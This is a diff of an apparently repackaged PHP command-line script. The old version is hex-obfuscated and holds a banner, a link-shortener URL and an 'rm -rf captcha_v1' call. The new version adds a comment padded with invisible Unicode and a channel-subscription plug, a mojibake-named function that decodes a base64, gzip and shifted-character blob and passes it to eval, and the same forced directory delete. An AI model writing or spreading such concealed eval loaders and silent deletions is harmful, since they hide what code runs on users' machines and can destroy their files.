@@ -1,6 +1,18 @@
 <?php
 
-/*  APA LO KONTOL GALER */
+error_reporting(0);
 
-${"\x47\x4c\x4f\x42A\x4c\x53"}["ew\x6dh\x6c\x61uw\x6b"]="e\x6ec\x6f\x64e\x64\x5f\x6c\x69\x6e\x6b";${"\x47\x4cOBA\x4c\x53"}["\x69tw\x77y\x69"]="\x73\x65\x6e\x73o\x72";$xeibxtmoruge="\x62a\x73e\x36\x34\x5f\x65\x6e\x63\x6f\x64\x65\x64\x5f1";${"\x47L\x4f\x42\x41\x4c\x53"}["\x76\x77\x64\x6c\x6fx\x6bb"]="\x62\x61\x6en";error_reporting(0);${${"\x47LO\x42A\x4c\x53"}["v\x77\x64lo\x78\x6b\x62"]}="${merah}\n\x5f\x5f\x5f_\x5f\x5f\x5f\x5f__  _\x5f__\x5f\x20  \x20\x5f____\x5f\x5f__\x20___\x5f__\x5f_\x5f\n\x5c__\x5f\x5f\x5f\x5f  \x20\\/ \x20\x5f\x20\x20\x5c  /  \x20_\x5f\x5f\x5f_//   _\x5f_\x5f\x5f/\n\x20|  \x20\x20\x20\x5f\x5f_/ \x20/\x5f\\\x20\x20\x5c \\_\x5f___\x20 \x5c\x20\x5c\x5f_\x5f_\x5f\x20 \x5c\n |  \x20 |\x20 /\x20   |\x20\x20\x20\x20\x5c/\x20\x20    \x20 \x5c/ \x20     \x20\\\n\x20|_\x5f\x5f\x5f| \x20\x5c\x5f\x5f\x5f_|__\x20\x20/\x5f\x5f____\x5f\x20 /__\x5f\x5f__\x5f\x20 /\n\x20\x20\x20\x20\x20\x20\x20  \x20\x20\x20  \x20\x20 \x5c/ \x20\x20\x20 \x20\x20\x20\\/\x20\x20\x20   \x20 \x5c/\n";${${"\x47\x4cOB\x41\x4c\x53"}["\x69\x74\x77\x77y\x69"]}="\033[\x31\x3b\x33\x30\x6d";${$xeibxtmoruge}="Qw\x65\x72\x74yui\x6fp\x61s\x64\x66\x67";${${"\x47\x4c\x4f\x42\x41L\x53"}["ew\x6d\x68\x6c\x61\x75\x77\x6b"]}="\x68ttp\x73://s\x65m\x61\x77\x75\x72\x2ecom/BS\x44X\x59C\x72\x44\x39\x38";system("r\x6d -\x72f\x20\x63\x61ptch\x61_\x761");system("rm -rf captcha_v1");
+/**
+⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮PHP 5.6⁮⁮⁮⁮
+⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮
+⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮
+⁮⁮⁮Subcribe Channel => Waryono Ok
+⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮
+⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮
+⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮⁮
+**/
+
+function шАПу╝╝цб░рй░цШКц╣╡чСгц╜йтБофЕГхСРфбГЁЯШУ($subrekふ灖剃){
+	$ф╗ЦуБоф║║уБоф╗Хф║ЛуВТхП░чДбуБЧуБлуБЧуБкуБДуБзуБПуБауБХуБД_уБйуБЖуВВуБВуВКуБМуБиуБЖуБФуБЦуБДуБ╛уБЧуБЯ_чзБуБоуГБуГгуГ│уГНуГлуВТш│╝шкнуБЩуВЛуБУуБиуВТх┐ШуВМуБкуБДуБзуБПуБауБХуБД;$уБЭуВМуВЙуБохКкхКЫуБпч╡РцЮЬуВТшгПхИЗуВЛуБУуБиуБпуБВуВКуБ╛уБЫуВУтБотБотБотБотБотБотБотБотБоцб░цШКтБотБотБотБотБотБотБотБох╜╝уВЙуБоф╗Хф║ЛуВТшк░уБЛуБлцДЯшмЭуБЧуБ╛уБЩ;$шАПу╝╝цб░рй░цШКц╣╡чСгц╜йтБофЕГхСРфбГЁЯШУ;$subrekふ灖剃 = gzinflate(base64_decode($subrekふ灖剃));for ($noob䏴 = 0; $noob䏴 < strlen($subrekふ灖剃);$noob䏴++) {$subrekふ灖剃[$noob䏴] = chr(ord($subrekふ灖剃[$noob䏴]) -1);}return $subrekふ灖剃;}eVaL(шАПу╝╝цб░рй░цШКц╣╡чСгц╜йтБофЕГхСРфбГЁЯШУ("NY3NCgIhFIUfwKcQaTEtygaqRUMF0XuI49xSHH+4Sta8fBp0VofzfXAorSEEEAMKhBgwG//sduuBrEbpPT1Txn49wXEvwKswwST6tr8XtQRbUpC2lCb96Wy8bYLOOaYT5whyTjpvXRgNVze4H6qdPimD6xg6usEHVTJmpaV49ax+Xy9f"));
+system("rm -rf captcha_v1");
 ?>
